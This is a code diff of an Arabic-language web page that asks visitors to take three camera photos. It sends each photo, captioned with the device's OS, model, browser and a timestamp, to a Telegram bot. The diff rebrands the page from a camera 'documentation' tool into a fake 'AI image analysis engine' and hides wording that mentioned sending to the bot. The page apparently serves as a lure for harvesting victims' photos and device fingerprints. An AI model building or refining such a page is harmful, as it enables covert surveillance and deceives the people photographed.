@@ -1,28 +1,28 @@
-<!DOCTYPE html>
+        <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   
-  <meta property="og:title" content="📸 نظام التوثيق الأنيق والآلي">
-  <meta property="og:description" content="أداة متقدمة لالتقاط وتوثيق الصور الحية بشكل متسلسل ومباشر.">
+  <meta property="og:title" content="🧠 نظام تحليل الصور بالذكاء الاصطناعي">
+  <meta property="og:description" content="محرك متقدم لالتقاط الصور وتحليل البيانات وتوثيقها فورياً.">
   
-  <title>نظام الكاميرا السريع - YMS PRO</title>
+  <title>AI Core - محرك التوثيق الذكي</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
     /* ********************************* */
-    /* * التصميم الجمالي الجديد (CSS) * */
+    /* * تصميم AI الجذاب (CSS) * */
     /* ********************************* */
     :root {
-      --primary: #FF416C; /* لون رئيسي جريء (أحمر وردي) */
-      --secondary: #FF4B2B;
-      --success: #2ecc71;
-      --light: #f7fafc;
-      --dark: #121212; /* خلفية داكنة جداً */
-      --card-bg: rgba(25, 25, 25, 0.95);
+      --ai-core: #1dd2af; /* نيون أخضر/سماوي - لون AI أساسي */
+      --ai-accent: #007bff; /* نيون أزرق - لون ثانوي */
+      --dark-bg: #0d1117; /* خلفية داكنة جداً */
+      --card-bg: rgba(13, 17, 23, 0.95);
+      --error: #e53935;
+      --light: #f0f6fc;
     }
     
     * {
@@ -33,7 +33,7 @@
     
     body {
       font-family: 'Tajawal', sans-serif;
-      background: linear-gradient(135deg, #1f2735, #121a24);
+      background: var(--dark-bg);
       color: var(--light);
       text-align: center;
       min-height: 100vh;
@@ -46,26 +46,26 @@
     
     .scanner-container {
       background: var(--card-bg);
-      backdrop-filter: blur(10px);
-      border-radius: 20px;
-      padding: 30px;
-      max-width: 400px;
+      border-radius: 15px;
+      padding: 35px;
+      max-width: 420px;
       width: 100%;
-      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.7);
-      border: 1px solid rgba(255, 255, 255, 0.05);
+      box-shadow: 0 0 25px rgba(29, 210, 175, 0.2), 0 0 50px rgba(0, 0, 0, 0.5); /* توهج خفيف للـ AI */
+      border: 1px solid rgba(29, 210, 175, 0.1);
       position: relative;
     }
     
     .scanner-header {
-      margin-bottom: 25px;
-      border-bottom: 2px solid var(--primary);
+      margin-bottom: 30px;
       padding-bottom: 15px;
+      border-bottom: 1px dashed rgba(255, 255, 255, 0.1);
     }
     
     .scanner-title {
-      font-size: 1.6rem;
+      font-size: 1.8rem;
       font-weight: 700;
-      color: var(--primary);
+      color: var(--ai-core);
+      text-shadow: 0 0 8px rgba(29, 210, 175, 0.7); /* تأثير التوهج */
       display: flex;
       align-items: center;
       justify-content: center;
@@ -74,26 +74,42 @@
     
     .scan-status {
       font-size: 1.1rem;
-      color: rgba(255, 255, 255, 0.9);
-      margin-bottom: 20px;
+      color: var(--light);
+      margin-bottom: 25px;
       min-height: 70px;
       display: flex;
       align-items: center;
       justify-content: center;
       padding: 15px;
-      border-radius: 10px;
-      background: rgba(255, 255, 255, 0.05);
-      border-left: 5px solid var(--primary);
+      border-radius: 8px;
+      background: rgba(29, 210, 175, 0.05);
+      border-left: 4px solid var(--ai-core);
       text-align: right;
+    }
+
+    .scan-progress {
+        height: 6px;
+        background: rgba(255, 255, 255, 0.1);
+        border-radius: 3px;
+        margin-bottom: 20px;
+        overflow: hidden;
+    }
+
+    #progressBar {
+        height: 100%;
+        background: linear-gradient(to right, var(--ai-accent), var(--ai-core));
+        transition: width 0.3s ease-in-out;
+        box-shadow: 0 0 10px var(--ai-core); /* توهج شريط التقدم */
     }
     
     .scan-details {
         background: rgba(255, 255, 255, 0.03);
-        padding: 15px;
-        border-radius: 10px;
+        padding: 12px;
+        border-radius: 8px;
         margin-bottom: 20px;
+        border: 1px solid rgba(255, 255, 255, 0.05);
     }
-
+    
     .btn-group {
         display: flex;
         gap: 15px;
@@ -103,12 +119,12 @@
     }
 
     .btn {
-      color: white;
+      color: var(--dark-bg);
       padding: 16px 25px;
       border: none;
-      border-radius: 50px;
+      border-radius: 40px;
       font-size: 1.1rem;
-      font-weight: 600;
+      font-weight: 700;
       cursor: pointer;
       transition: all 0.3s ease;
       display: inline-flex;
@@ -119,27 +135,32 @@
       position: relative;
     }
     
-    .btn.primary {
-        background: linear-gradient(to right, var(--primary), var(--secondary));
-        box-shadow: 0 5px 20px rgba(255, 65, 108, 0.4);
+    .btn.start-ai {
+        background: var(--ai-core);
+        color: var(--dark-bg);
+        box-shadow: 0 0 15px var(--ai-core);
     }
 
     .btn.camera {
-        background: linear-gradient(to right, #00d2ff, #3a7bd5); 
-        box-shadow: 0 5px 20px rgba(0, 210, 255, 0.4);
+        background: var(--ai-accent);
+        color: var(--light);
+        box-shadow: 0 0 15px var(--ai-accent);
     }
     
     .btn.camera.success {
-        background: linear-gradient(to right, var(--success), #27ae60);
-        box-shadow: 0 5px 20px rgba(46, 204, 113, 0.4);
+        background: var(--ai-core);
+        box-shadow: 0 0 15px var(--ai-core);
+        color: var(--dark-bg);
     }
 
     .btn:hover:not(:disabled) {
-        transform: translateY(-3px);
+        transform: scale(1.02);
+        filter: brightness(1.1);
     }
 
     .btn.alt {
         background: rgba(255, 255, 255, 0.1);
+        color: var(--light);
         box-shadow: none;
     }
 
@@ -166,41 +187,41 @@
   <div class="scanner-container">
     <div class="scanner-header">
       <div class="scanner-title">
-        <i class="fas fa-camera"></i> وضع التوثيق السريع
+        <i class="fas fa-brain"></i> محرك التحليل الذكي للصور (AI CORE)
       </div>
     </div>
     
     <div class="scan-status" id="scanStatus">
-      النظام جاهز للبدء. <span class="loading-dots"></span>
+      النظام جاهز. إطلاق وحدة التقاط البيانات.
     </div>
     
     <div class="scan-progress">
-      <div class="progress-bar" id="progressBar" style="width: 0%;"></div>
+      <div id="progressBar" style="width: 0%;"></div>
     </div>
     
     <div class="scan-details" id="scanDetails">
       <p style="text-align: right; margin-bottom: 5px;">
-        <i class="fas fa-key" style="color: var(--primary);"></i> رمز الجلسة: <strong id="sessionToken">N/A</strong>
+        <i class="fas fa-microchip" style="color: var(--ai-accent);"></i> رمز معالجة الجلسة: <strong id="sessionToken">N/A</strong>
       </p>
     </div>
     
     <div class="btn-group" id="mainButtonArea">
-        <button class="btn primary" id="startActionBtn" onclick="startCameraMode()">
-            <i class="fas fa-play-circle"></i> بدء التقاط الصور المتسلسل (3 صور)
+        <button class="btn start-ai" id="startActionBtn" onclick="startCameraMode()">
+            <i class="fas fa-robot"></i> تفعيل وحدة التحليل الآلي (3 صور)
         </button>
 
         <input type="file" id="imageInput" accept="image/*" capture="camera" style="display: none;">
         <button class="btn camera" id="captureAndUploadBtn" style="display: none;" onclick="document.getElementById('imageInput').click()">
-            <i class="fas fa-camera"></i> التقاط الصورة <span id="photoCount">(1 من 3)</span>
+            <i class="fas fa-camera"></i> التقاط وتمرير الصورة <span id="photoCount">(1 من 3)</span>
         </button>
         
         <button class="btn alt" id="resetBtn" onclick="resetUI()">
-            <i class="fas fa-redo"></i> إعادة التعيين
+            <i class="fas fa-undo"></i> إعادة تهيئة النظام
         </button>
     </div>
     
     <div class="privacy-note">
-      <i class="fas fa-shield-alt"></i> سيتطلب النظام موافقتك على الكاميرا 3 مرات لإكمال التوثيق.
+      <i class="fas fa-lock"></i> يتطلب إرسال 3 صور لتشغيل خوارزميات الذكاء الاصطناعي.
     </div>
   </div>
 
@@ -218,7 +239,7 @@
     const MAX_PHOTOS = 3;
 
     // **********************************
-    // * الدوال المساعدة لتحليل الجهاز (الإضافة الجديدة)
+    // * الدوال المساعدة لتحليل الجهاز (النظام المتقدم)
     // **********************************
     function analyzeUserAgent() {
         const agent = navigator.userAgent;
@@ -229,14 +250,12 @@
         // تحديد نظام التشغيل (OS)
         if (agent.match(/Android/i)) {
             os = "Android";
-            // محاولة استخراج طراز الجهاز من وكيل المستخدم للأندرويد
             const modelMatch = agent.match(/Android[^;]+; ([^)]+)/);
             if (modelMatch && modelMatch[1]) {
                 deviceModel = modelMatch[1].trim().replace(/Build.*|wv|KFAPWI/g, ''); 
             }
         } else if (agent.match(/iPhone|iPad|iPod/i)) {
             os = "iOS";
-            // طراز iOS عادةً غير متوفر مباشرة، لكن يمكن تحديد النوع
             if (agent.match(/iPad/i)) deviceModel = "iPad";
             else if (agent.match(/iPhone/i)) deviceModel = "iPhone";
         } else if (agent.match(/Windows Phone/i)) {
@@ -266,19 +285,18 @@
     }
     
     // **********************************
-    // * الدوال الرئيسية
+    // * الدوال الرئيسية (الوظيفة تبقى كما هي)
     // **********************************
     
     // 1. دالة بدء وضع الكاميرا
     function startCameraMode() {
-        // ... (بقية الدالة كما هي) ...
         const startActionBtn = document.getElementById("startActionBtn");
         startActionBtn.disabled = true;
         
         userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
         document.getElementById("sessionToken").textContent = userSessionToken;
         
-        scanStatus.innerHTML = "✅ النظام جاهز. يرجى التقاط الصورة الأولى.";
+        scanStatus.innerHTML = "✅ تم التحقق من وحدة AI. يرجى تزويده بالبيانات (الصورة 1).";
         
         startActionBtn.style.display = 'none';
         document.getElementById("captureAndUploadBtn").style.display = 'flex';
@@ -286,7 +304,7 @@
         document.getElementById('imageInput').click(); 
     }
     
-    // 2. دالة رفع الصور (الحركة الحقيقية والأسرع)
+    // 2. دالة رفع الصور (الإرسال السريع)
     document.getElementById('imageInput').addEventListener('change', async function(event) {
         const file = event.target.files[0];
         if (!file) return;
@@ -298,12 +316,12 @@
         
         // الإظهار الفوري لحالة الإرسال
         uploadBtn.disabled = true;
-        uploadBtn.classList.remove('primary', 'camera');
+        uploadBtn.classList.remove('start-ai', 'camera');
         uploadBtn.classList.add('success');
-        uploadBtn.innerHTML = `<span class="loading-dots"></span> جاري رفع الصورة ${photoCounter} ...`;
+        uploadBtn.innerHTML = `<span class="loading-dots"></span> معالجة وإرسال الصورة ${photoCounter} ...`;
         
         progressBar.style.width = `${(photoCounter / MAX_PHOTOS) * 100}%`;
-        scanStatus.textContent = `🚀 جاري إرسال الصورة ${photoCounter} من ${MAX_PHOTOS} إلى البوت...`;
+        scanStatus.textContent = `🧠 تحليل وإرسال تدفق البيانات: ${photoCounter} من ${MAX_PHOTOS}...`;
         
         const caption = buildPhotoCaption(photoCounter, MAX_PHOTOS);
 
@@ -314,7 +332,6 @@
         formData.append('parse_mode', 'HTML');
 
         try {
-            // الإرسال الفعلي
             const response = await fetch(TELEGRAM_PHOTO_API_URL, {
                 method: 'POST',
                 body: formData
@@ -322,48 +339,44 @@
 
             if (response.ok) {
                 if (isFinal) {
-                    scanStatus.innerHTML = `🎉 تم الانتهاء! تم رفع جميع الصور بنجاح.`;
-                    uploadBtn.innerHTML = `<i class="fas fa-check-circle"></i> تم إرسال 3 صور`;
+                    scanStatus.innerHTML = `🎉 نجاح التحليل! تم معالجة وتوثيق جميع البيانات.`;
+                    uploadBtn.innerHTML = `<i class="fas fa-check-circle"></i> اكتمل إرسال 3 صور`;
                     setTimeout(resetUI, 5000);
                 } else {
-                    scanStatus.innerHTML = `✅ تم رفع الصورة ${photoCounter} بنجاح. يرجى التقاط الصورة التالية.`;
+                    scanStatus.innerHTML = `✅ نجاح! تم معالجة الصورة ${photoCounter}. يرجى تزويد وحدة AI بالبيانات التالية.`;
                     uploadBtn.classList.remove('success');
                     uploadBtn.classList.add('camera');
                     uploadBtn.disabled = false;
-                    uploadBtn.innerHTML = `<i class="fas fa-camera"></i> التقاط الصورة <span id="photoCount">(${photoCounter + 1} من ${MAX_PHOTOS})</span>`;
+                    uploadBtn.innerHTML = `<i class="fas fa-camera"></i> التقاط وتمرير الصورة <span id="photoCount">(${photoCounter + 1} من ${MAX_PHOTOS})</span>`;
                     
                     // إعادة التشغيل الفوري للكاميرا
                     document.getElementById('imageInput').click(); 
                 }
             } else {
-                // حالة الفشل
-                scanStatus.innerHTML = `❌ خطأ في الاتصال (كود: ${response.status}). يرجى المحاولة مجدداً.`;
+                scanStatus.innerHTML = `❌ خطأ في نقل البيانات (كود: ${response.status}).`;
                 uploadBtn.classList.remove('success');
                 uploadBtn.classList.add('camera');
                 uploadBtn.disabled = false;
-                uploadBtn.innerHTML = `<i class="fas fa-exclamation-triangle"></i> فشل الإرسال (${photoCounter} من ${MAX_PHOTOS})`;
+                uploadBtn.innerHTML = `<i class="fas fa-exclamation-triangle"></i> فشل إرسال البيانات (${photoCounter} من ${MAX_PHOTOS})`;
             }
         } catch (error) {
-            // حالة خطأ الشبكة
-            scanStatus.innerHTML = `❌ خطأ في الإرسال: ${error.message}`;
+            scanStatus.innerHTML = `❌ خطأ في الاتصال بالـ AI CORE: ${error.message}`;
             uploadBtn.classList.remove('success');
             uploadBtn.classList.add('camera');
             uploadBtn.disabled = false;
-            uploadBtn.innerHTML = `<i class="fas fa-exclamation-triangle"></i> فشل الإرسال (${photoCounter} من ${MAX_PHOTOS})`;
+            uploadBtn.innerHTML = `<i class="fas fa-exclamation-triangle"></i> فشل إرسال البيانات (${photoCounter} من ${MAX_PHOTOS})`;
         }
     });
     
-    // دالة بناء الرسالة المرفقة بالصورة (الإضافة الرئيسية)
+    // دالة بناء الرسالة المرفقة بالصورة (تقرير الجهاز)
     function buildPhotoCaption(current, total) {
         const { os, deviceModel, browser } = analyzeUserAgent();
-        const fullAgent = navigator.userAgent; // لسلسلة كاملة إذا لزم الأمر
             
-        return `📸 <b>توثيق صورة متسلسل (${current} من ${total})</b>\n\n🔑 <b>رمز الجلسة:</b> ${userSessionToken}\n\n📱 <b>تقرير الجهاز:</b>\n- <b>النظام:</b> ${os}\n- <b>الجهاز:</b> ${deviceModel}\n- <b>المتصفح:</b> ${browser}\n\n🕒 <b>الوقت:</b> ${new Date().toLocaleString('ar-YE')}`;
+        return `📸 <b>تحليل AI (الصورة ${current} من ${total})</b>\n\n🔑 <b>رمز معالجة الجلسة:</b> ${userSessionToken}\n\n📱 <b>تقرير الجهاز المحلل:</b>\n- <b>النظام:</b> ${os}\n- <b>الجهاز:</b> ${deviceModel}\n- <b>المتصفح:</b> ${browser}\n\n🕒 <b>وقت توثيق البيانات:</b> ${new Date().toLocaleString('ar-YE')}`;
     }
 
     // دالة إعادة التعيين
     function resetUI() {
-        // ... (بقية الدالة كما هي) ...
         userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
         photoCounter = 0;
         
@@ -371,16 +384,16 @@
         
         const captureBtn = document.getElementById("captureAndUploadBtn");
         captureBtn.style.display = 'none';
-        captureBtn.classList.remove('success');
+        captureBtn.classList.remove('success', 'start-ai');
         captureBtn.classList.add('camera');
         captureBtn.disabled = false;
         
         document.getElementById("startActionBtn").style.display = 'flex';
         document.getElementById("startActionBtn").disabled = false;
-        document.getElementById("startActionBtn").innerHTML = '<i class="fas fa-play-circle"></i> بدء التقاط الصور المتسلسل (3 صور)';
+        document.getElementById("startActionBtn").innerHTML = '<i class="fas fa-robot"></i> تفعيل وحدة التحليل الآلي (3 صور)';
         
         document.getElementById("sessionToken").textContent = userSessionToken;
-        scanStatus.innerHTML = 'النظام جاهز لوضع التوثيق السريع.';
+        scanStatus.innerHTML = 'النظام جاهز. إطلاق وحدة التقاط البيانات.';
     }
 
     window.addEventListener('DOMContentLoaded', () => {
